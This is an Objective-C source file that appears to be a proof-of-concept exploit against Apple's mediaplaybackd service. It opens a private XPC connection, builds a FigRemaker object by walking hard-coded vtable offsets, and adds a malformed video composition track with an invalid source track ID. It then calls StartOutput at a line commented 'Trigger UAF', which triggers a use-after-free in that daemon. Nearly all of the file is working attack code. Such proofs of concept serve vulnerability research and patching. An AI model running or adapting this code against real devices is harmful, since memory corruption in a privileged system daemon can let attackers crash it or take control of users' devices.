#import <CoreMedia/CoreMedia.h>
#import <Foundation/Foundation.h>

void *getMutableCompositionFigFormatReader(void) {
  xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.coremedia.mediaplaybackd.mutablecomposition.xpc", NULL, 0);
  xpc_connection_set_event_handler(conn, ^(xpc_object_t event){ });
  xpc_connection_resume(conn);

  xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_uint64(msg, ".Operation", 'crea');
  uint64_t mcID = xpc_dictionary_get_uint64(xpc_connection_send_message_with_reply_sync(conn, msg), ".objectID");

  msg = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_uint64(msg, ".Operation", 'cpfr');
  xpc_dictionary_set_uint64(msg, ".objectID", mcID);
  xpc_dictionary_set_bool(msg, "MakeImmutableSnapshot", 0);

  uint64_t frID = xpc_dictionary_get_uint64(xpc_connection_send_message_with_reply_sync(conn, msg), "FormatReader");

  if (!frID) {
    NSLog(@"Format reader creation failed\n");
    return 0;
  }

  NSLog(@"Mutable Composition frID: 0x%llX\n", frID);

  void *figFormatReader = malloc(0x40);
  void *figFormatReaderStorage = figFormatReader + 0x20;
  *(uint64_t *)(figFormatReaderStorage) = frID;

  return figFormatReader;
}

static CFNumberRef CFNumberCreateLL(long long v) { return CFNumberCreate(kCFAllocatorDefault, kCFNumberLongLongType, &v); }

static CFDictionaryRef CreateTimeDict(long long epoch, long long flags, long long timescale, long long value) {
  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

  CFNumberRef nEpoch = CFNumberCreateLL(epoch);
  CFNumberRef nFlags = CFNumberCreateLL(flags);
  CFNumberRef nTimescale = CFNumberCreateLL(timescale);
  CFNumberRef nValue = CFNumberCreateLL(value);

  CFDictionarySetValue(dict, CFSTR("epoch"), nEpoch);
  CFDictionarySetValue(dict, CFSTR("flags"), nFlags);
  CFDictionarySetValue(dict, CFSTR("timescale"), nTimescale);
  CFDictionarySetValue(dict, CFSTR("value"), nValue);

  CFRelease(nEpoch);
  CFRelease(nFlags);
  CFRelease(nTimescale);
  CFRelease(nValue);

  return dict;
}

CFArrayRef CreateTimeArray(void) {
  CFDictionaryRef endTimeDict = CreateTimeDict(0, 1, 600, 2082);
  CFDictionaryRef startTimeDict = CreateTimeDict(0, 1, 1, 0);
  CFMutableDictionaryRef topDict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

  CFDictionarySetValue(topDict, CFSTR("EndTime"), endTimeDict);
  CFDictionarySetValue(topDict, CFSTR("StartTime"), startTimeDict);

  CFMutableArrayRef array = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
  CFArrayAppendValue(array, topDict);

  CFRelease(endTimeDict);
  CFRelease(startTimeDict);
  CFRelease(topDict);

  return array;
}

CFURLRef CreateCFURLFromBundleFile(NSString *fileWithExtension) {
  NSString *fileName = [fileWithExtension stringByDeletingPathExtension];
  NSString *fileExtension = [fileWithExtension pathExtension];
  NSURL *fileURL = [[NSBundle mainBundle] URLForResource:fileName withExtension:fileExtension];
  if (fileURL) {
    return (__bridge_retained CFURLRef)fileURL;
  } else {
    NSLog(@"File '%@' not found in bundle.", fileWithExtension);
    return NULL;
  }
}

CFURLRef getDestURL(NSString *filepath) {
  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:filepath];
  NSURL *url = [NSURL fileURLWithPath:path];

  //  delete the file if it already exists
  NSError *error = nil;
  [[NSFileManager defaultManager] removeItemAtURL:url error:&error];

  CFURLRef cfURL = (__bridge CFURLRef)url;
  CFRetain(cfURL);
  return cfURL;
}

uint64_t FigRemakerRemoteCreateBaseWithURLs(void *remakerRemote, CFURLRef sourceURL, void *sourceFormatReader, CFURLRef destURL, uint64_t unk, CFDictionaryRef formatWriterOptions, CFDictionaryRef remakerOptions, void *figRemaker);

typedef uint64_t (*AddVideoCompositionTrack)(void *figRemakerRemote, CFArrayRef sourceTrackArray, CFArrayRef sourceSampleDataTrackArray, CFArrayRef sourceVideoTrackWindowsForTrackIDs, CFArrayRef sourceSampleDataTrackWindowsForTrackIDs, CFStringRef RemakerFamilyVideoCompositorType, CFArrayRef videoCompositionvInstructionsArray, void *, void *, void *, void *, void *, CMTime frameDuration,
uint32_t sourceTrackIDForFrameTiming, uint32_t renderWidth, uint32_t renderHeight, uint32_t width, uint32_t height, CFDictionaryRef videoScalingProperties, uint64_t videoCodecType, CFDictionaryRef videoEncoderSpecification, CFDictionaryRef videoCompressionProperties, CFDictionaryRef videoProcessingOptions,
                                             CFDictionaryRef videoCompositionProcessorOptions, void *out);

typedef uint64_t (*StartOutput)(void *figRemakerRemote);

void remaker(void) {
  void *sourceFormatReader = getMutableCompositionFigFormatReader();

  CFURLRef destURL = getDestURL(@"dest.mp4");

  CFStringRef keys[] = {CFSTR("Remaker_FastStart"), CFSTR("Remaker_NoInterruptions")};
  CFTypeRef values[] = {kCFBooleanTrue, kCFBooleanFalse};
  CFDictionaryRef remakerOptions = CFDictionaryCreate(kCFAllocatorDefault, (const void **)keys, (const void **)values, 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

  CFStringRef keys1[] = {CFSTR("FileFormat")};
  CFTypeRef values1[] = {CFSTR("QuickTimeMovie")};
  CFDictionaryRef formatWriterOptions = CFDictionaryCreate(kCFAllocatorDefault, (const void **)keys1, (const void **)values1, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

  void *figRemaker = 0;
  uint64_t figReamkerID = 0;
  uint64_t ret = FigRemakerRemoteCreateBaseWithURLs(0, 0, sourceFormatReader, destURL, 0, formatWriterOptions, remakerOptions, &figRemaker);

  if (!ret) {
    figReamkerID = *(uint64_t *)(figRemaker + 0x28);
    NSLog(@"FigRemakerRemote: %p, id: 0x%llX", figRemaker, figReamkerID);
  }

  CFArrayRef sourceTrackArray = (__bridge CFArrayRef) @[];
  CFArrayRef videoCompositionvInstructionsArray = CreateTimeArray();
  CMTime frameDuration = CMTimeMake(10, 600);
  uint32_t sourceTrackIDForFrameTiming = 888;
  CFDictionaryRef videoProcessingOptions = (__bridge CFDictionaryRef) @{@"Remaker_MultiPass" : @NO};
  CFDictionaryRef videoCompositionProcessorOptions =
      (__bridge CFDictionaryRef) @{@"VideoCompositionProcessor_CompositionTransferFunction" : @"ITU_R_709_2",
                                   @"VideoCompositionProcessor_CompositionColorPrimaries" : @"ITU_R_709_2",
                                   @"VideoCompositionProcessor_CompositionYCbCrMatrix" : @"ITU_R_709_2",
                                   @"VideoCompositionProcessor_HDRDisplayMetadataPolicy" : @"VideoCompositionProcessorHDRDisplayMetadataPolicy_Propagate"};

  CFDictionaryRef videoScalingProperties = (__bridge CFDictionaryRef) @{@"DestinationYCbCrMatrix" : @"ITU_R_709_2",
                                                                        @"DestinationTransferFunction" : @"ITU_R_709_2",
                                                                        @"MatrixHandling" : @"PreserveMatrix",
                                                                        @"DestinationColorPrimaries" : @"ITU_R_709_2"};

  CFDictionaryRef videoCompressionProperties = (__bridge CFDictionaryRef) @{};

  uintptr_t figRemaker_vtable = *(uint64_t *)(figRemaker + 0x18);
  uintptr_t figRemaker_vtable_ = *(uint64_t *)(figRemaker_vtable + 0x10);
  AddVideoCompositionTrack addVCTrack = (AddVideoCompositionTrack)(*(uint64_t *)(figRemaker_vtable_ + 0x70));

  uint64_t outTrackID = 0;
  ret = addVCTrack(figRemaker, sourceTrackArray, NULL, NULL, NULL, CFSTR("RemakerFamilyVideoCompositor_DeviceSpecific"), videoCompositionvInstructionsArray, NULL, NULL, NULL, NULL, NULL, frameDuration, sourceTrackIDForFrameTiming, 1920, 1080, 1920, 1080, videoScalingProperties, 'hvc1', NULL, videoCompressionProperties, videoProcessingOptions, videoCompositionProcessorOptions, &outTrackID);

  NSLog(@"addVCTrack ret: %llX, outTrackID: %llX", ret, outTrackID);

  // Trigger UAF
  StartOutput startOutput = (StartOutput)(*(uint64_t *)(figRemaker_vtable_ + 0x38));
  ret = startOutput(figRemaker);

  exit(0);
}

void main() { remaker(); }
